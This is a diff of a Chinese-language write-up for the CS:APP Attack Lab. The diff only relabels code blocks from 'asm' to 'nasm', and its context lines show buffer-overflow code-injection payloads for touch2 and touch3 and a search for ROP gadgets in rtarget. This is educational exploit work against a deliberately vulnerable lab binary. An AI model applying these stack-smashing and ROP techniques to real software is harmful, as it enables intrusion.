@@ -23,7 +23,7 @@ code-injection攻击只适合这种，没有`栈随机化`和`限定可执行代
 
 第一个阶段很简单，只要先查看给函数`getbuf`分配了多少栈空间，利用缓冲区溢出，修改`ret`指令的返回地址(上一个栈帧的栈顶)就行。
 
-```asm
+```nasm
 00000000004017a8 <getbuf>:
   4017a8: 48 83 ec 28                  	subq	$0x28, %rsp
   4017ac: 48 89 e7                     	movq	%rsp, %rdi
@@ -79,7 +79,7 @@ PASS: Would have posted the following:
 
 正常来说带参数调用函数，应该是先对参数赋值，然后进入函数。
 
-```asm
+```nasm
 movl $cookie, %edi
 call <touch2>
 ```
@@ -115,7 +115,7 @@ writeup中说明了，最好不要使用call或者jmp指令，所以我们仍然
 
 所以初步的攻击代码如下:
 
-```asm
+```nasm
 movl    $0x59b997fa, %edi
 pushq   $0x4017ec
 ret
@@ -219,7 +219,7 @@ xx xx xx xx xx xx xx xx # <- %rip 即将要执行的攻击代码
 
 因为我们要手动填写`??`那一行，`touch3`的第一个参数`%rdi`要填入`??`那一行的地址。通过前文，或者gdb直接打印地址就行:`0x5561dca8`
 
-```asm
+```nasm
 mov   $0x5561dca8, %rdi
 push  $0x4018fa
 ret
@@ -227,7 +227,7 @@ ret
 
 获取这段代码的字节码：
 
-```asm
+```nasm
 
 attack3.o:     file format elf64-x86-64
 
@@ -341,7 +341,7 @@ gadget 2: ret;                  # 然后ret进入touch2
 
 在`rtarget.asm`中，很容易找到:
 
-```asm
+```nasm
   401419: 69 c0 5f c3 00 00            	imull	$0xc35f, %eax, %eax     # imm = 0xC35F
 ```
 
@@ -432,7 +432,7 @@ c3       # ret
 
 先按照前缀找:`48 89`
 
-```asm
+```nasm
 0000000000401aab <setval_350>:
   401aab: c7 07 48 89 e0 90            	movl	$0x90e08948, (%rdi)     # imm = 0x90E08948
   401ab1: c3                           	retq
